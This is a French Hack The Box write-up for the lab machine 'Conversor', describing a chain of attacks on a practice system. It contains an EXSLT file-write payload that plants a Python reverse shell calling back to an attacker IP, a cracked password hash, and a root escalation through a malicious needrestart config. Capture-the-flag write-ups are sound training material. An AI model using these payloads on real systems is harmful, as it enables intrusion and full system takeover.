---
date: 2026-03-20T06:13:51-05:00
# description: ""
image: "/images/HTB-Conversor/Conversor.png"
showTableOfContents: true
tags: ["Hackthebox", "xslt-injection", "cronjob-abuse", "arbitrary-file-write", "needrestart", "exslt", "linux-privesc", "source-code-review"]
categories: ["Writeups"]
title: "HTB: Conversor"
type: "post"
---

* Platform: Hack The Box
* Lien: [Conversor](https://app.hackthebox.com/machines/Conversor)
* Niveau: Facile
* OS: Linux
---

Conversor commence par la découverte d'un service de conversion XML vulnérable à l'exécution arbitraire de feuilles de style XSLT. En exploitant les éléments d'extension EXSLT, nous parvenons à écrire arbitrairement des fichiers dans le répertoire de l'application web. Une tâche cron planifiée exécutant des scripts Python à partir de cet emplacement accessible en écriture nous permet d'obtenir l'exécution de code à distance et un point d'ancrage initial en tant que `www-data`. Une exploration plus approfondie révèle un fichier de base de données contenant les identifiants d'un autre utilisateur du système, ce qui permet un déplacement latéral. Enfin, les privilèges root sont obtenus en exploitant les droits d'exécution élevés de l'utilitaire `needrestart`.

# Balayage

```
nmap -sC -sV -oA nmap/Conversor {TARGET_IP}
```

**Résultats**
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 19:49 EDT
Nmap scan report for 10.129.238.31 (10.129.238.31)
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)

80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.75 seconds
```

Le scan nmap détecte deux ports ouverts : le port 22 (SSH) et le port 80 (HTTP). Il y a également une redirection vers `conversor.htb`.

```
sudo echo "{IP} conversor.htb" | sudo tee -a /etc/hosts
```

# Énumération

En accédant à `http://conversor.htb`, on arrive sur une page de connexion.

![Conversor website](/images/HTB-Conversor/conversor_website.png)

Une fois inscrits et connectés, nous trouvons une application permettant de convertir des fichiers XML.

![Conversor tool](/images/HTB-Conversor/conversor_convertor.png)

> Un fichier `XSLT` sert à transformer des données XML en un autre format, tel que HTML, du texte brut ou une autre structure XML.

L'application accepte deux fichiers (`XML` et `XSLT`) et génère un fichier HTML.

Nous testons cette fonctionnalité avec deux fichiers simples.

`nmap.xml`
```xml
<host>
  <ip>10.10.10.5</ip>
  <port>22</port>
</host>
```

`nmap.xslt`
```XML
<?xml version="1.0"?>

<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:template match="/">
  <html>
    <body>
      <xsl:apply-templates/>
    </body>
  </html>
</xsl:template>

<xsl:template match="host">
  <p>Host IP: <xsl:value-of select="ip"/></p>
  <p>Open Port: <xsl:value-of select="port"/></p>
</xsl:template>

</xsl:stylesheet>
```

![Conversor HTML file](/images/HTB-Conversor/conversor_HTML_file.png)

![Conversor HTML file display](/images/HTB-Conversor/HTML_file_display.png)

Puisque nous traitons des fichiers XSLT, nous recherchons une vulnérabilité de type injection. Sur [cette page](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection) nous avons accès à des payloads d'injection XSLT.

Fichier XSLT utilisé
```XML
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<br />Version: <xsl:value-of select="system-property('xsl:version')" />
<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

Notre payload retourne les informations du fournisseur confirmant la vulnérabilité liée à l'injection XSLT.

![XSLT injection](/images/HTB-Conversor/XSLT_injection.png)

Nous poursuivons notre exploration par une attaque par force brute sur les répertoires et trouvons `/about`.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://conversor.htb
```

![directory brute forcing](/images/HTB-Conversor/conversor_gobuster.png)

À l'adresse `http://conversor.htb/about`, nous pouvons télécharger le code source de l'application!

![Conversor source code](/images/HTB-Conversor/conversor_src_code.png)

Il s'agit d'une application Python. Bien que nous ayons confirmé la vulnérabilité, nous ne pouvons pas encore obtenir d'exécution de code à distance (RCE), étant donné que les applications Python ne traitent pas elles-mêmes le XSLT, mais s'appuient sur différentes bibliothèques. Dans notre cas, il s'agit de `libxslt`.

Avec `libxslt`, nous disposons généralement :
* de l'exécution XSLT
* de la prise en charge EXSLT (écriture de fichiers possible)
* de `document()` (lecture de fichiers / SSRF)

Cela signifie qu'un RCE direct pendant le processus de transformation n'est probablement pas possible. Cependant, comme nous disposons très certainement de la prise en charge EXSLT, nous pouvons essayer d'obtenir un RCE via l'écriture de fichiers, ce qui nécessite un répertoire accessible en écriture sur la cible.

Nous trouvons un fichier `users.db` dans le répertoire `instance` ; le nôtre est vide puisque nous n'avons pas installé la solution sur notre système.

![Conversor database file](/images/HTB-Conversor/conversor_db.png)

En lisant `install.md`, nous apprenons qu'une tâche cron exécute toutes les minutes des scripts Python situés dans le répertoire `/var/www/conversor.htb/scripts/`. 

![Conversor cronjob](/images/HTB-Conversor/conversor_cron.png)

# Accès Initial

Nous modifions notre fichier pour cibler le répertoire vulnérable, puis nous soumettons le nouveau fichier `XSLT`.

```XML
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:exsl="http://exslt.org/common"
                extension-element-prefixes="exsl"
                version="1.0">

  <xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("YOUR_IP",PORT_NUMBER))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/sh")
    </exsl:document>
  </xsl:template>

</xsl:stylesheet>
```

Sur le listener, nous obtenons un shell sous l'identifiant `www-data`.

![Conversor foothold](/images/HTB-Conversor/conversor_foothold.png)

Nous améliorons le shell à l'aide des commandes ci-dessous.
```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

## Shell en tant que fismathack

Dans `/var/www/conversor.htb/instance`, nous trouvons `users.db`. À l'intérieur de ce fichier de base de données, nous trouvons le hachage du mot de passe de l'utilisateur `fismathack`.

![Conversor hash](/images/HTB-Conversor/conversor_hash.png)

```
5b5c3ac3a1c897c94caad48e6c71fdec
```

```
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Nous récupérons le mot de passe `Keepmesafeandwarm`.

![fismathack password](/images/HTB-Conversor/fismathack.png)

Nous passons à l'utilisateur `fismathack` et lisons le drapeau utilisateur.

![Conversor user flag](/images/HTB-Conversor/conversor_user.png)

# Élévation des privilèges

Avec `sudo -l`, nous consultons les privilèges sudo.

![sudo privileges](/images/HTB-Conversor/conversor_sudo_privs.png)

L'utilisateur `fismathack` peut exécuter `/usr/sbin/needrestart` en tant que `sudo` sans avoir à saisir de mot de passe.

En consultant les pages de manuel (`man needrestart`), nous voyons que `needrestart` accepte des fichiers de configuration grâce à l'option `-c`. 

![needrestart man pages](/images/HTB-Conversor/man_needrestart.png)

Nous créons un fichier de configuration malveillant nommé `root.conf` afin de générer un shell root.
```
system("/bin/bash");
```

```
sudo /usr/sbin/needrestart -c /tmp/root.conf
```

![root shell](/images/HTB-Conversor/conversor_root.png)

